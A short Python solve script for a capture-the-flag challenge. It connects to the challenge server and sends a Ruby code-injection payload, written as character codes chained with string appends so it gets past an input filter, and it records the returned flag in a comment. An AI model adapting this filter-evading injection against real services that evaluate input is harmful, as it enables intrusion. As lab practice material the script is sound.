import socket

host = 'talk-to-me-dd00922915bfc3f1.squarectf.com'
port = 5678

s = socket.socket()
s.connect((host,port))
hello = b"(''<<112)+(''<<117)+(''<<116)+(''<<115)+(''<<32)+(''<<34)+(''<<72)+(''<<101)+(''<<108)+(''<<108)+(''<<111)+(''<<33)+(''<<34)"
# hello = b"''<<72<<101<<108<<108<<111<<33\n"
s.recv(1024)
s.send(hello)
print(s.recv(1024).decode())
# It's so great to talk to you! Maybe you know what to do with this flag-2b8f1139b0726726?
